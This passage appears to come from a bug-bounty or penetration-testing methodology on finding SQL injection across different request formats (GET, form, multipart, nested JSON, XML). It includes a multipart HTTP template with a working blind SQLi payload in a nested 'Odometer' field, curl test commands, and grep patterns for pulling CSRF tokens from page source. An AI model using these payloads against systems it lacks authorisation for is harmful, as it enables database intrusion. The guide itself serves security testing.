# PART 6: Request Format Coverage (added 2026-06-12)

### 6.1 The Format Blind Spot

A second SQLi was found on `www.example.target.com` (same xoxo platform, different country) using `multipart/form-data` with nested JSON. The "deep" scan of 3,166 target-corp domains missed it completely because it only tested GET query parameters.

**Root cause**: The scanner appended `?param=payload` to URLs. The real endpoint required:
- `POST` method (not GET)
- `multipart/form-data` Content-Type with boundary
- JSON-encoded `filters` field containing nested params like `Odometer`
- `token1` decoded from base64 in page source
- `PHPSESSID` cookie

None of these are discoverable from HTML `<input name="">` scraping.

### 6.2 Request Formats to Test (MANDATORY for every endpoint)

| Format | Content-Type | How to discover | How to test |
|--------|-------------|-----------------|-------------|
| GET query | n/a (`?key=val`) | HTML `<form method=GET>`, href links | `curl "url?param=payload"` |
| POST form | `application/x-www-form-urlencoded` | HTML `<form method=POST>`, JS `$.post()` | `curl -d "param=payload"` |
| POST multipart | `multipart/form-data; boundary=X` | JS `new FormData()`, file upload forms | `curl -F "param=payload"` |
| POST JSON | `application/json` | JS `fetch(url, {body: JSON.stringify(...)})` | `curl -H "Content-Type: application/json" -d '{"param":"payload"}'` |
| POST JSON nested | `application/json` | JS data objects with sub-objects | Test EACH nested field: `{"filters":{"Odometer":"PAYLOAD"}}` |
| POST XML/SOAP | `text/xml` | WSDL, `.asmx`, `SOAPAction` header | `curl -H "Content-Type: text/xml" -d "<param>PAYLOAD</param>"` |

### 6.3 Multipart SQLi Testing Template

```http
POST /endpoint HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----b
X-Requested-With: XMLHttpRequest
Cookie: PHPSESSID=SESSION_HERE

------b
Content-Disposition: form-data; name="action"

getlistings
------b
Content-Disposition: form-data; name="filters"

{"Type":"","Odometer":"10000'^(SCHEMA() LIKE 0x74657374)^'"}
------b
Content-Disposition: form-data; name="token1"

TOKEN_FROM_PAGE_SOURCE
------b--
```

### 6.4 Token Extraction Patterns

Many endpoints require anti-CSRF or validation tokens embedded in page source:

```bash
# Base64-encoded tokens in JS
grep -oE "const token[0-9]+ = ['\"][A-Za-z0-9+/=]+['\"]" page.html
# Decode: echo "BASE64_VALUE" | base64 -d

# Hidden form fields
grep -oE 'name="(_token|csrf|token1|nonce)"[^>]*value="[^"]*"' page.html

# Meta tags
grep -oE 'meta name="csrf-token" content="[^"]*"' page.html

# JS variables
grep -oE "(csrfToken|_token|nonce)\s*[=:]\s*['\"][^'\"]+['\"]" page.html *.js
```

### 6.5 Nested JSON Field Extraction

When a param is a JSON string containing sub-fields, EACH sub-field is a separate injection point:

```javascript
// JS source shows:
filters: JSON.stringify({
    Type: "",
    State: [],
    Make: "",
    Series: [],
    BodyStyle: [],
    FuelType: "",
    minPrice: "",
    maxPrice: "",
    Odometer: "10000"  // ← THIS is the injection point
})
```

To extract nested params from JS:
```bash
# Find JSON.stringify calls
grep -oE 'JSON\.stringify\(\{[^}]+\}' page.html *.js

# Find object literals assigned to data/body/params
grep -oE '(data|body|params|filters)\s*[=:]\s*\{[^}]+\}' page.html *.js

# Find FormData.append calls
grep -oE "\.append\(['\"][^'\"]+['\"]" page.html *.js
```

### 6.6 Updated "Deep Test" Definition

**A scan is NOT deep unless it covers ALL 4 layers:**

1. **Layer 1 — HTML GET params**: Surface scan, lowest ROI, catches only legacy PHP `$_GET`
2. **Layer 2 — JS-discovered endpoints**: Playwright network capture + JS analysis. Finds AJAX/fetch/XHR endpoints with correct Content-Type and params. **HIGHEST ROI**
3. **Layer 3 — Authenticated surface**: Session cookies, decoded tokens, auth'd-only endpoints. Where custom queries (not ORM) live
4. **Layer 4 — Request format variants**: multipart, JSON body, nested JSON fields, XML/SOAP. Each format is a SEPARATE attack surface

**Rule: Layer 1 alone = surface scan. NEVER call it "deep test". Real deep = all 4 layers.**

**Evidence**: 3,166 domains × 5 techniques × Layer 1 only = 0 SQLi found. 1 domain × 10 min JS reading × Layer 2+3+4 = SQLi confirmed (example.target.com). Breadth without depth is theater.

---

